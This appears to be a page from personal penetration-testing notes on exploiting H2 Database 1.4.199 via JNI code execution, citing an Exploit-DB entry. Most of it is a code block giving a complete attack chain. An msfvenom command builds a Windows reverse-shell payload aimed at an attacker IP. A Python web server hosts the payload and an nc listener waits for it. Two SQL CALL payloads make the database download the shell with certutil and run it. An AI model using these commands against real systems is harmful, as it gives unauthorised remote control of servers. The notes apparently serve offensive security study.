---
description: Version 1.4.199
---

# H2 Database Engine

H2 Database 1.4.199 - JNI Code Execution

[https://www.exploit-db.com/exploits/49384](https://www.exploit-db.com/exploits/49384)

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Basically, you find a console, add each payload run the commands above.&#x20;

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Create a shell 
Kali> msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.183 LPORT=8082

Kali> sudo python -m http.server 80

Kali> rlwrap nc -nlvp 8082

# For -- Evaluate script 
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.183/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');

```
{% endcode %}
